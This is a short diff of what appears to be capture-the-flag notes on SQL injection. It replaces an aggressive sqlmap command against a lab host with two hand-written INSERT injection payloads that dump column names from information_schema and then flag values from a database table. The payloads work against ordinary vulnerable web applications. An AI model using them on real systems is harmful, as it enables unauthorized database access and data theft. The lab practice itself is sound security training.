@@ -36,6 +36,10 @@ sqlmap -u "https://64cul97j.eu1.ctfio.com/?email=test" --level 5 --risk 3 -p ema
 # ERROR based INSERT
 
 ```bash
-sqlmap -u "https://gley1x8x.eu1.ctfio.com/" --data='title=test&comment=test' --method POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dbs
+title', (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='flag' AND TABLE_SCHEMA='sqli_five'));-- '
+```
+
+```bash
+title', (SELECT GROUP_CONCAT(flag_value) FROM sqli_five.flag));-- '
 ```
 
